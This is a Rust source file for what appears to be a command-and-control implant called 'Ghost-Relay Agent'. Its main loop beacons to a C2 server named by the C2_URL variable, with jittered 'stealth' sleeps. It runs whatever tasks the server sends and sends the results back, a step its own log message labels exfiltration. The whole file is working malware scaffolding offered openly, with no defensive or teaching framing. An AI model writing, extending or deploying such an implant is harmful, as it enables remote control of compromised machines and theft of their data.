mod comms;
mod evasion;
mod modules;

use log::{info, error};
use rand::Rng;
use comms::GhostComms;
use evasion::stealth_sleep;
use modules::run_module;
use uuid::Uuid;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info"))
        .format_timestamp(None)
        .init();

    info!("Ghost-Relay Agent v1.0 initializing...");

    let c2_url = std::env::var("C2_URL").unwrap_or_else(|_| "http://localhost:8443".to_string());
    let comms = GhostComms::new(c2_url.clone());
    
    let agent_id = Uuid::new_v4().to_string();
    info!("Agent ID: {}", agent_id);

    loop {
        match comms.send_heartbeat(&agent_id).await {
            Ok(Some(response)) => {
                if let Some(tasks) = response.get("tasks").and_then(|t| t.as_array()) {
                    for task in tasks {
                        let task_id = task.get("task_id").and_then(|v| v.as_str()).unwrap_or("unknown");
                        let payload = task.get("payload").cloned().unwrap_or(serde_json::json!({}));
                        
                        info!("Executing task: {}", task_id);
                        match run_module(task_id, payload).await {
                            Ok(result) => {
                                info!("Task {} completed.", task_id);
                                
                                // NEW: Send result back to server
                                if let Err(e) = comms.send_result(&agent_id, task_id, &result).await {
                                    error!("Exfiltration failed: {}", e);
                                }
                            },
                            Err(e) => error!("Task {} failed: {}", task_id, e),
                        }
                    }
                }
                let jitter = rand::thread_rng().gen_range(0..30);
                stealth_sleep(30 + jitter);
            }
            Ok(None) => {
                stealth_sleep(60);
            }
            Err(e) => {
                error!("Comms error: {}. Sleeping 5m.", e);
                stealth_sleep(300);
            }
        }
    }
}
